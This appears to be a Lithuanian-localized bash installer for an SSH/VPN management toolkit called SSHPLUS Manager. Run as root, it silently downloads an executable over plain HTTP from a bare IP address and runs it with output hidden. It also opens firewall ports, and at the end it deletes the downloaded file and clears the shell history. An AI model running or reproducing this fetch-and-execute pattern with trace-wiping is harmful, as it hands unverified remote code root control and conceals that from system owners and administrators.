#!/bin/bash

wget http://185.34.52.93:81/html/SSHPLUS/Install/list > /dev/null 2>&1

clear
[[ $EUID -ne 0 ]] && {
echo -e "\033[1;33mAtsiprasome, \033[1;33mjums reikia paleisti kaip root\033[0m"
rm -rf $HOME/Plus > /dev/null 2>&1; exit 0
}
cd $HOME
fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "  \033[1;33mPALAUKITE \033[1;37m- \033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "  \033[1;33mPALAUKITE \033[1;37m- \033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}

echo -e "\033[1;31m════════════════════════════════════════════════════\033[0m"
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%40s%s%-12s\n' "SVEIKI ATVYKE I SSHPLUS MANAGER" ; tput sgr0
echo -e "\033[1;31m════════════════════════════════════════════════════\033[0m"
echo ""
echo -e "             \033[1;31mDEMESIO! \033[1;33mTAI YRA SKRIPTAS !\033[0m"
echo ""
echo -e "\033[1;31m• \033[1;33mBUS IDIEGTAS SKRIPTO RINKINYS KAIP IRANKIS\033[0m" 
echo -e "\033[1;33m  TINKLO, SISTEMOS IR VARTOTOJU VALDYMUI\033[0m"
echo ""
echo -e "\033[1;32m• \033[1;32mPATARIMAS! \033[1;33mNAUDOKITE TAMSIA TEMA JUSU TERMINALE\033[0m"
echo -e "\033[1;33m  GERESNE PATIRTIS IR VIZUALIZACIJA!\033[0m"
echo ""
echo -e "\033[1;31m≠×≠×≠×≠×≠×≠×≠×[\033[1;33m • \033[1;32mSSHPLUS MANAGER\033[1;33m •\033[1;31m ]≠×≠×≠×≠×≠×≠×≠×\033[0m"
echo ""
echo -ne "\033[1;36mPALAUKITE... \033[1;32m OK !\033[1;37m "
chmod +x list && ./list > /dev/null 2>&1
echo ""
IP=$(wget -qO- ssh-plus.tk/meuip.php)
IP2=$(wget -qO- http://whatismyip.akamai.com/)
[[ "$IP" != "$IP2" ]] && ipdovps="$IP2" || ipdovps="$IP"
[[ -f "$HOME/usuarios.db" ]] && {
    clear
    echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
    echo ""
	echo -e "                 \033[1;33m• \033[1;31mDEMESIO \033[1;33m• \033[0m"
	echo ""
    echo -e "\033[1;33mVartotojo duomenu baze \033[1;32m(usuarios.db) \033[1;33mBuvo" 
    echo -e "Rasta! Norite issaugoti ja issaugodami prisijungimu limitus"
	echo -e "vartotoju dubliuotu prisijungimu? Ar norite"
    echo -e "sukurti nauja duomenu baze ?\033[0m"
	echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mIslaikyti dabartine duomenu baze\033[0m"
	echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mKurti nauja duomenu baze\033[0m"
	echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
    echo ""
	tput setaf 2 ; tput bold ; read -p "Pasirinkti ?: " -e -i 1 optiondb ; tput sgr0
} || {
	awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
}
[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
clear
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' " PALAUKITE IDIEGIMO" ; tput sgr0
echo ""
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mATNAUJINAMA SISTEMA \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
echo ""
echo -e "    \033[1;33mATNAUJINIMAI PAPRASTAI UZTRUNKA!\033[0m"
echo ""
fun_attlist () {
    apt-get update -y
}
fun_bar 'fun_attlist'
clear
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mDIEGIAMI PAKETAI \033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "\033[1;33mKAI KURIE PAKETAI YRA LABAI REIKALINGI !\033[0m"
echo ""
inst_pct () {
_pacotes=("bc" "screen" "nano" "unzip" "lsof" "netstat" "dos2unix" "nload" "jq" "curl" "figlet" "python3" "python-pip")
for _prog in ${_pacotes[@]}; do
    apt install $_prog -y
done
pip install speedtest-cli
}
fun_bar 'inst_pct'
[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
clear
echo ""
echo -e "              \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mBAIGIAMAS DIEGIMAS \033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "      \033[1;33mUZBAIGIMO FUNKCIJOS IR APIBREZIMAI! \033[0m"
echo ""
clear
echo ""
cd $HOME
echo -e "        \033[1;33m • \033[1;32mUZBAIGTAS IDIEGIMAS\033[1;33m • \033[0m"
echo ""
echo -e "\033[1;31m \033[1;33mNaudokite komandą : \033[1;32mmenu\033[0m"
echo -e "\033[1;33m DAUGIAU INFORMACIJOS \033[1;31m(\033[1;36mTELEGRAME\033[1;31m): \033[1;37mRolkos Grupe\033[0m"
rm -rf $HOME/Plus && rm -rf $HOME/list && cat /dev/null > ~/.bash_history && history -c
echo "$ipdovps" >/etc/IP

